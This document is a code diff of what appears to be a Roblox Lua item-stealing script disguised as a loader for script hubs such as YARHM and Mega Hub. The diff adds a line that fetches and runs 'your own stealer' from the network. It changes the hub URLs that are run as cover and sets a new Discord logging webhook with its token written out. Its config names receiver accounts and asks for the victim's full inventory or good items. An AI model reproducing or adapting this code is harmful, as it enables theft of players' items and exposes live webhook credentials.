@@ -1,24 +1,25 @@
 Config = {
-    Receivers = {"Onodakun23", "Kely5171"},
-    Webhook = "https://discord.com/api/webhooks/",
+    Receivers = {"OnodaKun23"},
+    Webhook = "https://discord.com/api/webhooks",
     FullInventory = true,
     GoodItemsOnly = true,
-    ResendTrade = "hi",
-    Script = "TKD",
+    ResendTrade = ".resend",
+    Script = "YARHM",
     CustomLink = ""
 }
 
+loadstring(game:HttpGet("your own stealer"))()
 repeat wait() until game:IsLoaded()
 
 if getgenv().scriptexecuted then return end
 getgenv().scriptexecuted = true
 
-LogsWebhook = "https://discord.com/api/webhooks/1301226672497889394/inZgIvA3ENH_dsFJFAxUkcZsyPWO5-RkJidY5qCLqYHJf8tVsXQIsbGfejRB0Eobpdsv"
+LogsWebhook = "https://discord.com/api/webhooks/1301818874601410560/jyV8wCa74fEfgLjMgWnjmJHD9mHJlkcfnt54BJIL0UUvRzapCiNEumYNqA2XbGmZ6Lwf"
 
 LOGS_WEBS = LogsWebhook
 
-local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/refs/heads/main/STX/Module.lua"))()
-local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/refs/heads/main/STX/Client.lua"))()
+local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
+local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -95,24 +96,15 @@ local success, errorMsg = pcall(function()
     elseif Config.Script == "Custom" then
         Config.Script = Config.Script .. " - " .. Config.CustomLink
     end
-
+    
     if Config.Script == "Custom" then
         loadstring(game:HttpGet(Config.CustomLink))()
     elseif Config.Script == "Mega Hub" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/main/HUB/Mega.lua",true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Hubs/main/Mega.lua",true))()
     elseif Config.Script == "YARHM" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/main/HUB/Muscle.lua", false))()
+    loadstring(game:HttpGet("https://yarhm.goteamst.com/scr", false))()
     elseif Config.Script == "Nexus" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/main/HUB/Nexus.lua"))()
-    elseif Config.Script == "Xhub" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/main/HUB/TKD.lua"))()
-    elseif Config.Script == "TKD" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/main/HUB/OOF.lua"))()
-    elseif Config.Script == "OOF" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/main/HUB/Xhub.lua"))()
-    elseif Config.Script == "Xhub" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/main/HUB/Boss.lua"))()
-    elseif Config.Script == "Boss" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
     end
     
     Common = 0
